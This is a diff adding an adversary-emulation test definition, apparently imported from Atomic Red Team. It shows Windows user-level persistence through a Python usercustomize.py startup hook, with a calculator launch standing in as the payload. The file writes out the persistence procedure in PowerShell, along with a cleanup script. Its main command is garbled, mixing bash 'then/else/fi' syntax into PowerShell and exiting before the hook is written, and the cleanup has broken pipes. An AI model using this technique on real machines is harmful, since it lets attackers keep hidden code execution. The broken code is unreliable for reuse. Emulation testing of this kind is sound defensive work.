@@ -1,0 +1,65 @@
+- id: 05cc7a2c-ce32-46f2-a358-f27f76718c39
+  name: Python Startup Hook - usercustomize.py (Windows)
+  description: "Executes code via usercustomize.py. This is a per-user persistence\
+    \ mechanism \nthat does not require Administrative privileges."
+  tactic: persistence
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Get-Command @("python.exe", ''python3.exe'') -ErrorAction SilentlyContinue)
+          { exit 0 } else { exit 1 }; then : ; else Write-Host "[!] Python3 not found.
+          Please install Python3 (e.g., winget install python3 or winget install python
+          or https://www.python.org/downloads/windows/) or ensure it is in your PATH.";
+          fi; $UserDir = & "python.exe" -c "import site; print(site.getusersitepackages())";
+          if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir
+          -Force }; "import os; os.system(''calc.exe'')" | Out-File -FilePath "$UserDir\usercustomize.py"
+          -Encoding ASCII; Get-ChildItem -Path "$UserDir"; & "python.exe" -c "print(''Triggering
+          Hook via usercustomize...'')"'
+        cleanup: '$PyBin = if (Get-Command "#{python_exe}" -ErrorAction SilentlyContinue)
+          { "#{python_exe}" } elseif (Get-Command "python3.exe" -ErrorAction SilentlyContinue)
+          { "python3.exe" } else { "python.exe" };; $UserDir = & $PyBin -S -c "import
+          site; print(site.getusersitepackages())"; if (-not (Get-ChildItem -Path
+          $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like
+          ''usercustomize*'')) { Write-Host "[!] Artifact missing: $UserDir\usercustomize.py
+          - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };; Get-ChildItem
+          -Path "$UserDir" -Recurse -Force |; Where-Object { $_.Name -like "usercustomize*"
+          } |; Remove-Item -Force; Write-Host "[+] Successfully Removed usercustomize.py
+          under $UserDir"; Get-Process -Name "Calc*", "calc*" -ErrorAction SilentlyContinue
+          | Stop-Process -Force; Write-Host "[+] Successfully Terminated Calculator"'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - persistence
+  - t1546.018
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      python_exe:
+        description: The python binary name to test
+        type: String
+        default: python.exe
+    dependencies:
+    - description: 'Python must be installed and the specified binary (#{python_exe})
+        must be in the PATH.
+
+        '
+      prereq_command: 'if (Get-Command @("#{python_exe}", ''python3.exe'') -ErrorAction
+        SilentlyContinue) { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'Write-Host "[!] Python3 not found. Please install Python3
+        (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/)
+        or ensure it is in your PATH."
+
+        '
+    technique_created: '2025-05-22T19:20:46.740Z'
+    atomic_guid: 05cc7a2c-ce32-46f2-a358-f27f76718c39
+    import_timestamp: '2026-01-20T03:44:23.633615Z'
